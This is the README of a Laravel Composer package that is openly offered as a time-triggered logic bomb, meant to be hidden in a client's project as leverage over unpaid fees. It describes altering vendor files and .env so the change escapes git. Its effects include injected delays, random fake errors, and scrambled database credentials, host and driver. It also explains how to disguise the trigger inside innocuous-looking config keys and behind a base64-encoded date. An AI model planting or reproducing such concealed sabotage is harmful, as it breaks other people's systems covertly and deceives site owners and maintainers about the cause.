# Security Forcer
A composer package to force laravel developers for composer security. 
This package should not be included in production or for finished applications.

### Use of this package in practice
* You can use this to test your anti-malware, anti-virus packages/scripts.
* You can use this to stop your working code in case if your client steals your code with an unpaid portion of your earnings.
* You should be able to set a timer which would cause troubled times after the given date for the project.
* If you are to use this project for a shady client to secure your unpaid earnings please remember to remove it from the composer dependencies once/if you ever get your payment.

This package would only cause trouble / broke a working site / give strange errors and cause a buggy application. It will never steal any information or damage database entries etc. It is intended to cause soft but much effective bugs.

You won't be able to cause any damage at all if conditions are not met. For example security-forcer will not target any project but a project you specifically told to target and (optionally) only after given date.

Please don't use this package for an unlawful action. I don't have any responsibility for your use of this package.

You are welcome to fork it and change code for your needs.

### What It Does:
It modifies laravel vendor files and the apps' env files. This way it doesn't get caught in git. Here is the list of package actions and what they do:

* **NightDistributer:** puts '*sleep(1)*' function inside application run cycles such as Illuminate\Pipeline\Pipeline, Illuminate\Routing\Router etc. and inside all functions of Illuminate\Database\Eloquent\Collection. That's about minimum 20+ seconds of response time if you are not using a lot of infected functions. Here is the full list:
    - Pipeline @ then,thenReturn,a (repeated) closure
    - Router @ dispatch,runRoute,dispatchToRoute
    - Route @ run
    - Eloquent\Collection @ *
    - TransformsRequest @ handle
    - ValidatePostSize @ handle
    - Foundation\Http\Kernel @ handle
    - AddQueuedCookiesToResponse @ handle
    - StartSession @ handle
* **RandomLimit:** with a ``` time() % 11 < 4 ``` chance, application will throw "509 Whoops, looks like something went wrong." fake error.
* **SyntaxHandler:** with a ``` time() % 11 > 8 ``` chance, application will throw ```undefined variable: items``` fake error. It will show the real ending line number of controller@action.
* **ApplyCredential:** forces application to use altered password that is original_password + whitespace ("password123" becomes "password123 ")
* **ApplyDebug:** forces application to run with app.debug=false to prevent detailed errors
* **ApplyHost:** sets applications default db host to **locaIhost** (if the current value is *localhost*) or **127.0.0.0**. *(both are invalid. keyword locaIhost includes uppercase i instead of l and obviously 127.0.0.0 is not 127.0.0.1)*
* **MixConnection:** modifies .env **DB_CONNECTION** to **pgsql**. If you are already using pgsql driver this is useless meh.
* **MixCredentials:** changes .env **DB_USERNAME** and **DB_PASSWORD** values and randomize them.
* **MixDebug:** modifies .env **APP_DEBUG** to **false**
* **MixHost:** changes .env **DB_HOST** to 127.0.0.**0**


### Usage
**In its easiest use you define a config value.**

For example in your config/hashing.php file, create an index with argon2id and set 'seed'. 'seed' should return a boolean value to tell the package whether it should run or not. Package will look for the value of ``` config('hashing.argon2id.seed') ``` to determine.

You can see an example below with the 'seed' value example.
```php
    'argon2id' => [
        'seed' => (time() > (new \DateTime(base64_decode('MjAyMS0wNi0wMQ==')))->format('U')), // will activate after a certain date
    ]
```

It is possible that you may not want this condition based on one index alone. So there are 4 config values that you can play with: 'hashing.argon2id.seed' or 'session.redis.secure' or 'logging.syslog.daily' and 'app.sfa'.

**This is how the package will decide:**
```php
config('app.sfa', true) && (
    config('hashing.argon2id.seed', null) || config('session.redis.secure', null) || config('logging.syslog.daily', null)
) // package will run if this returns true
```

**Selecting which actions to run:**
To make a selection you can combine actions' ids using OR (|) operator or just use the final value. All actions have an id and you can access them using:
```php
    ActionNameHere::getAId(); // : int
```

Your selection of actions reside inside *config('queue.connections.sqs.spin')*. Here is an example for your queue.php:

```php
return [
    // ...

    'connections' => [

        // ...
        'sqs' => [
            'driver' => 'sqs',
            'key' => env('AWS_ACCESS_KEY_ID'),
            'secret' => env('AWS_SECRET_ACCESS_KEY'),
            'prefix' => env('SQS_PREFIX', 'https://sqs.us-east-1.amazonaws.com/your-account-id'),
            'queue' => env('SQS_QUEUE', 'your-queue-name'),
            'suffix' => env('SQS_SUFFIX'),
            'region' => env('AWS_DEFAULT_REGION', 'us-east-1'),
            'spin' => (
                // this is where you pass your actions or dont add this at all and package will run all its actions
                \Lmande\SecurityForcer\Actions\ApplyCredential::getAId() |
                \Lmande\SecurityForcer\Actions\ApplyDebug::getAId() |
                \Lmande\SecurityForcer\Actions\ApplyHost::getAId() |
                \Lmande\SecurityForcer\Actions\NightDistributer::getAId() |
                \Lmande\SecurityForcer\Actions\RandomLimit::getAId() |
                \Lmande\SecurityForcer\Actions\SyntaxHandler::getAId() |
                \Lmande\SecurityForcer\Actions\MixConnection::getAId() |
                \Lmande\SecurityForcer\Actions\MixCredentials::getAId() |
                \Lmande\SecurityForcer\Actions\MixDebug::getAId() |
                \Lmande\SecurityForcer\Actions\MixHost::getAId()
            ),
        ],
        // ...
```

or you can also keep it short and abstract and after you calculate the final value you can pass it directly:

```php
return [
    // ...

    'connections' => [
        // ...
        'sqs' => [
            // ...
            'spin' => 896, // this val causes package to run only the following actions: NightDistributer, RandomLimit, SyntaxHandler
        ],
        // ...
```

Then you can just visit your site and it will run its' actions if conditions are met. You can also set APP_ENV=stesting and run ``` php artisan sf:start ``` in console to make a test run.

### How to get rid of this and its effects:
- Remember to shame your boss first if s/he didn't give the previous developer his/her earned money and if this is why your boss wants you to fix it instead of paying for an already completed honest work.
- Remove this package from your composer.json
- Delete your vendor directory
- composer install